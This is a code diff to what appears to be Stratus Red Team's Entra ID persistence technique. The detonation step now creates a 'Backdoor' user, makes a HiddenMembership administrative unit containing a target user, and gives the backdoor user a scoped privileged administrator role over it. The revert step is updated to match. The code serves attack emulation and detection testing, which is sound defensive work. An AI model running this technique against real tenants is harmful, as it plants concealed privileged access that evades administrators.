@@ -25,12 +25,13 @@ Create a HiddenMembership [Administrative Unit (AU)](https://learn.microsoft.com
 
 Warm-up:
 
-- Create two Entra ID users (Backdoor, Target)
+- Create Target Entra ID user
 - Initialize Privileged Administration Administrator role
 
 Detonation:
 
 - Create HiddenMembership AU
+- Create Backdoor Entra ID user
 - Add Target user to AU
 - Assign Backdoor user Privileged Administration Administrator over AU
 
@@ -63,12 +64,12 @@ Consider detection of additional Administrative Unit activities and scoped role 
 
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
 	// Fetch details from TF
-	backdoorUserId := params["backdoor_user_id"]
-	backdoorUserName := params["backdoor_user_name"]
 	roleId := params["paa_role_id"]
 	targetUserId := params["target_user_id"]
 	targetUserName := params["target_user_name"]
 	suffix := params["suffix"]
+	domain := params["domain"]
+	password := params["random_password"]
 
 	//graphClient setup
 	graphClient, err := graph.NewGraphServiceClientWithCredentials(providers.Azure().GetCredentials(), nil)
@@ -76,10 +77,38 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 		return errors.New("could initialize Graph client: " + err.Error())
 	}
 
+	// 0. Create Backdoor User
+	requestBodyUser := graphmodels.NewUser()
+	accountEnabled := true
+	requestBodyUser.SetAccountEnabled(&accountEnabled) 
+	displayName := fmt.Sprintf("Stratus Backdoor User - %s", suffix)
+	requestBodyUser.SetDisplayName(&displayName) 
+	mailNickname := "StratusB"
+	requestBodyUser.SetMailNickname(&mailNickname) 
+	userPrincipalName := fmt.Sprintf("stratus-red-team-hidden-au-backdoor-%s@%s", suffix, domain)
+	requestBodyUser.SetUserPrincipalName(&userPrincipalName) 
+	passwordProfile := graphmodels.NewPasswordProfile()
+	forceChangePasswordNextSignIn := true
+	passwordProfile.SetForceChangePasswordNextSignIn(&forceChangePasswordNextSignIn) 
+	// Using password from Terraform
+	passwordProfile.SetPassword(&password) 
+	requestBodyUser.SetPasswordProfile(passwordProfile)
+
+	userResult, err := graphClient.Users().Post(context.Background(), requestBodyUser, nil)
+
+	if err != nil {
+		return errors.New("could not create backdoor user: " + err.Error())
+	}
+
+	// 0.a. Save User ID from creation activity
+	backdoorUserId := *userResult.GetId()
+	backdoorPrincipalName := *userResult.GetUserPrincipalName()
+	log.Println("Created Backdoor User " + backdoorPrincipalName)
+
 	// 1. Create Hidden AU
 	requestBodyAU := graphmodels.NewAdministrativeUnit()
-	displayName := fmt.Sprintf("Stratus Hidden AU - %s", suffix)
-	requestBodyAU.SetDisplayName(&displayName) 
+	displayNameAU := fmt.Sprintf("Stratus Hidden AU - %s", suffix)
+	requestBodyAU.SetDisplayName(&displayNameAU) 
 	description := "Hidden AU created from Stratus"
 	requestBodyAU.SetDescription(&description) 
 	visibility := "HiddenMembership"
@@ -120,7 +149,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 		return errors.New("could not assign role: " + err.Error())
 	}
 
-	log.Println("Assigned PAA scoped role to backdoor user " + backdoorUserName)
+	log.Println("Assigned PAA scoped role to backdoor user " + backdoorPrincipalName)
 	
 	return nil
 }
@@ -151,7 +180,27 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
     }
 
 	// 2. Delete Hidden AU
-	graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)
+	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)
+	if err != nil {
+		return errors.New("could not delete AU: " + err.Error())
+	}
+
+	// 3. Get backdoor user ID
+	userResult, err := graphClient.Users().Get(context.Background(), nil)
+	var userId string
+    for _, user := range userResult.GetValue() {
+        userName := *user.GetDisplayName()
+		if strings.HasSuffix(userName, suffix){
+			userId = *user.GetId()
+			break
+		}
+    }
+
+	// 4. Delete backdoor user
+	err = graphClient.Users().ByUserId(userId).Delete(context.Background(), nil)
+	if err != nil {
+		return errors.New("could not delete backdoor user: " + err.Error())
+	}
 
 	return nil
 }
